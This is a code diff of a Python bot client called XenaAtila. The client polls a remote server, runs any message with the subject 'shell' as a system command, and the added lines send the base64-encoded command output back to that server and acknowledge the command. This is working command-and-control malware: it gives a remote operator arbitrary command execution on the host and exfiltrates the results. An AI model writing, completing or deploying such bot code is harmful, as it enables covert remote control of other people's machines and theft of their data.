@@ -6,7 +6,7 @@ from env import Env
 from requests import post, get
 from uuid import uuid4
 from typing import Union
-from base64 import b64decode
+from base64 import b64decode, b64encode
 from services.system import System
 
 # Unique identifier of this bot instance.
@@ -81,18 +81,27 @@ class XenaAtila:
       subject = message.subject
       content = b64decode(message.content).decode('utf-8')
 
-      print(subject + ': ' + content)
-
-      # Response message.
-      serialized_response: Union[None, str] = None
-
       if subject == 'shell':
         shell_output = System.do(content)
         
-        print('shell output: ' + shell_output)
+        message_insertion = post(self.remote + "/v1/messages", data = {
+          'from': client_id,
+          'to': None,
+          'subject': 'shell-output',
+          'content': b64encode(str.encode(shell_output)),
+          'replyTo': message.id,
+        })
 
-        # WiP. Issuea the message and go.
-        response_message = Message()
+        if (message_insertion.status_code != 200):
+          continue
+        
+        message_ack = post(self.remote + '/v1/messages', data = {
+          'id': message.id,
+          'status': 'STATUS'
+        })
+
+        if (message_ack.status_code != 200):
+          logging.warn('Message ACK failure has occured, but it is not handled!')
 
   # Make yourself known to the remote host.
   def identify(self, remote_host: str) -> bool:
